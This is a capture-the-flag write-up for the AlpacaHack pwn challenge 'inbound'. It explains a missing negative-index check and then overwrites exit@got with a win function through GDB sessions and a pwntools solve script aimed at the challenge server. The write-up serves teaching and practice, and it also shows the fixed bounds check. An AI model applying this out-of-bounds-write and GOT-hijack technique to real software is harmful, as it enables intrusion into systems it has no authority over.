# inbound

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- 57 solves / 128 points
- Author: @ptr-yudai
- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

inside-of-bounds

## Enumeration

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-6-Pwn/inbound/inbound.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/inbound)-[2024.11.04|11:52:43(HKT)]
└> file inbound.tar.gz 
inbound.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 30720
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/inbound)-[2024.11.04|11:52:45(HKT)]
└> tar xvfz inbound.tar.gz 
inbound/
inbound/inbound
inbound/Dockerfile
inbound/main.c
inbound/compose.yml
```

`inbound/inbound`:

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/inbound)-[2024.11.04|11:53:18(HKT)]
└> cd inbound 
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/inbound/inbound)-[2024.11.04|11:53:20(HKT)]
└> file inbound 
inbound: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9e9920e6eb161f0ee40de853d38ffad7488f06e7, for GNU/Linux 3.2.0, not stripped
```

As we can see, this `inbound` binary is an ELF 64-bit executable.

Memory protection:

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/inbound/inbound)-[2024.11.04|11:53:22(HKT)]
└> pwn checksec ./inbound 
[...]
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- RELRO: Partial RELRO, which means the GOT table can be overwritten
- Stack: No canary, which means we don't need to worry about leaking the canary
- NX: NX enabled, which means the stack is not executable
- PIE: No PIE, which means the base address is fixed (`0x400000`)

Let's try to run it!

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/inbound/inbound)-[2024.11.04|11:54:28(HKT)]
└> ./inbound     
index: 
```

In here, we can enter an index number. Let's try 1:

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/inbound/inbound)-[2024.11.04|11:54:28(HKT)]
└> ./inbound     
index: 1
value: 
```

Then, we can enter a value for this index number:

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/inbound/inbound)-[2024.11.04|11:54:28(HKT)]
└> ./inbound     
index: 1
value: 1337
slot[0] = 0
slot[1] = 1337
slot[2] = 0
slot[3] = 0
slot[4] = 0
slot[5] = 0
slot[6] = 0
slot[7] = 0
slot[8] = 0
slot[9] = 0
```

After that, it'll display the updated slot array's values.

Now we have a high-level overview of this binary, let's read its source code, `main.c`!

First off, we can see that there's a function called `win`, which executes OS command `/bin/cat /flag.txt`:

```c
/* Call this function! */
void win() {
  char *args[] = {"/bin/cat", "/flag.txt", NULL};
  execve(args[0], args, NULL);
  exit(1);
}
```

With that said, we need to somehow call this function.

Function `main`:

```c
int slot[10];
[...]
int main() {
  int index, value;
  [...]
  printf("index: ");
  scanf("%d", &index);
  if (index >= 10) {
    puts("[-] out-of-bounds");
    exit(1);
  }

  printf("value: ");
  scanf("%d", &value);

  slot[index] = value;

  for (int i = 0; i < 10; i++)
    printf("slot[%d] = %d\n", i, slot[i]);

  exit(0);
}
```

In this function, it first checks whether the index is greater or equals to `10` or not. If it is, the function prints out "`[-] out-of-bounds`" and exit the program.

If the index number is not out-of-bounds, `slot[index]`'s value will be updated to our provided value and exit the program.

Hmm... Although the index number did restrict to positive `10`, it did not check for **negative number**, thus it's vulnerable to **out-of-bounds write**. 

The correct validation should be like this:

```c
scanf("%d", &index);
if (index < 0 || index >= 10) {
  puts("[-] out-of-bounds");
  exit(1);
}
```

To have a better understanding in this vulnerability, we can use GDB to debug the binary:

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/inbound/inbound)-[2024.11.04|12:13:07(HKT)]
└> gdb ./inbound     
[...]
gef➤  
```

> Note: I'm using [GEF](https://github.com/hugsy/gef) plugin.

To start debugging, we need to set a breakpoint. To do so, we can set it at function `main` + 268, which is right before the last `printf` function call:

```c
gef➤  disassemble main 
Dump of assembler code for function main:
[...]
   0x000000000040133d <+268>:	mov    eax,0x0
   0x0000000000401342 <+273>:	call   0x4010b0 <printf@plt>
   [...]
gef➤  b *main+268
Breakpoint 1 at 0x40133d
```

Now, let's run the program until we hit the breakpoint:

```shell
gef➤  r
[...]
index: 0
value: 1337

Breakpoint 1, 0x000000000040133d in main ()
[...]
```

In here, we can find the `slot`'s memory content!

Since `slot` is a global variable, we can use command `info variables slot` to find the `slot` global variable's memory address:

```shell
gef➤  info variables slot
[...]
0x0000000000404060  slot
```

Next, we can use the `x` command to view a memory address's content:

```shell
gef➤  x/6gx 0x0000000000404060
0x404060 <slot>:	0x0000000000000539	0x0000000000000000
0x404070 <slot+16>:	0x0000000000000000	0x0000000000000000
0x404080 <slot+32>:	0x0000000000000000	0x0000000000000000
```

As we can see, address `0x404060` has content `0x539`, which is `1337` in decimal.

Now, let's try index number `-1` and see what will happen:

```shell
gef➤  r
[...]
index: -1
value: 1337

Breakpoint 1, 0x000000000040133d in main ()
[...]
gef➤  x/6gx 0x0000000000404060
0x404060 <slot>:	0x0000000000000000	0x0000000000000000
0x404070 <slot+16>:	0x0000000000000000	0x0000000000000000
0x404080 <slot+32>:	0x0000000000000000	0x0000000000000000
```

Oh, it's not in the `slot` memory address! It's now in address `0x404050`!

```shell
gef➤  x/-6gx 0x0000000000404060
0x404030:	0x0000000000000000	0x0000000000000000
0x404040 <stdout@GLIBC_2.2.5>:	0x00007ffff7f94760	0x0000000000000000
0x404050 <stdin@GLIBC_2.2.5>:	0x00007ffff7f93a80	0x0000053900000000
```

## Exploitation

Hmm... Now we can leverage the out-of-bounds write vulnerable to overwrite an address's value. But where should we overwrite to?

Since the binary doesn't have GOT protection (Partial RELRO), we can try to **hijack a GOT function to the `win` function address**. In the debugging session, we can enter `got` command to see all the GOT functions:

```shell
gef➤  got
[...]
GOT protection: Partial RelRO | GOT functions: 6
 
[0x404000] puts@GLIBC_2.2.5  →  0x401030
[0x404008] setbuf@GLIBC_2.2.5  →  0x7ffff7e3f2c0
[0x404010] printf@GLIBC_2.2.5  →  0x7ffff7e135b0
[0x404018] execve@GLIBC_2.2.5  →  0x401060
[0x404020] __isoc99_scanf@GLIBC_2.7  →  0x7ffff7e13150
[0x404028] exit@GLIBC_2.2.5  →  0x401080
```

Now you might ask: "Which GOT function should we hijack?"

Because the `main` function only executes once, we have to hijack functions that are going to be used right after the out-of-bounds write operation, which are `printf` and `exit`:

```c
int main() {
  [...]
  slot[index] = value;

  for (int i = 0; i < 10; i++)
    printf("slot[%d] = %d\n", i, slot[i]);

  exit(0);
}
```

Hmm... Hijack `printf` GOT function? If we look at the value of its' address, it is 6 bytes long:

```shell
gef➤  got
[...]
[0x404010] printf@GLIBC_2.2.5  →  0x7ffff7e135b0
```

Let's try to hijack it.

To calculate the offset between `slot` and GOT function `printf` address, we can do like `(printf_got_address - slot_address) // 4`:

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/inbound/inbound)-[2024.11.04|12:56:14(HKT)]
└> python3
[...]
>>> slot = 0x404060
>>> (0x404010 - slot) // 4
-20
```

Function `win` address in decimal:

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/inbound/inbound)-[2024.11.04|12:59:37(HKT)]
└> objdump -d inbound | grep 'win' 
00000000004011d6 <win>:
```

```shell
>>> 0x4011d6
4198870
```

> Note: The reason why we're using decimal value is that the `scanf` function will only format integer values.

```shell
gef➤  r
[...]
index: -20
value: 4198870

Breakpoint 1, 0x000000000040133d in main ()
[...]
gef➤  x/gx 0x404010
0x404010 <printf@got.plt>:	0x00007fff004011d6
```

As we can see, we can't hijack GOT function `printf`. This is because the original value is 6 bytes long, but **the `win` function address is 3 bytes only**.

Ok, so we can only overwrite GOT function that only 3 bytes long.

**If we check the GOT functions, `exit` does match to our condition:**
```shell
gef➤  got
[...]
[0x404028] exit@GLIBC_2.2.5  →  0x401080
```

Nice! Let's try to overwrite GOT function `exit` with the `win` function address!

Index offset:

```shel
>>> (0x404028 - slot) // 4
-14
```

```shell
gef➤  r
[...]
index: -14
value: 4198870

Breakpoint 1, 0x000000000040133d in main ()
[...]
gef➤  x/gx 0x404028
0x404028 <exit@got.plt>:	0x00000000004011d6
gef➤  c
Continuing.
slot[0] = 0
[...]
/bin/cat: /flag.txt: No such file or directory
```

Nice! It worked!

Armed with the above information, we can write a Python solve script to get the flag on the remote instance.

<details><summary><strong>solve.py</strong></summary>

```python
#!/usr/bin/env python3
from pwn import *

binaryPath = './inbound'
elf = context.binary = ELF(binaryPath)
# p = process(binaryPath)
p = remote('34.170.146.252', 51979)

# gdbScript = '''
# b *main+268
# '''
# gdb.attach(p, gdbscript=gdbScript)

# out-of-bounds write to hijack GOT function `exit` with function `win` address
EXIT_GOT = elf.got['exit']
WIN = elf.symbols['win']
SLOT = elf.symbols['slot']

offset = (EXIT_GOT - SLOT) // 4
log.success('exit@got address: %s', hex(EXIT_GOT))
log.success('slot symbol address: %s', hex(SLOT))
log.success('win symbol address: %s', hex(WIN))
log.success('Offset: %d', offset)

p.sendlineafter(b'index: ', str(offset).encode())
payload = str(WIN).encode()
p.sendlineafter(b'value: ', payload)
p.interactive()
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/inbound/inbound)-[2024.11.04|13:11:45(HKT)]
└> python3 solve.py
[...]
[+] exit@got address: 0x404028
[+] slot symbol address: 0x404060
[+] win symbol address: 0x4011d6
[+] Offset: -14
[...]
Alpaca{p4rt14L_RELRO_1s_A_h4pPy_m0m3Nt}
```

- **Flag: `Alpaca{p4rt14L_RELRO_1s_A_h4pPy_m0m3Nt}`**

## Conclusion

What we've learned:

1. Hijack GOT via out-of-bounds write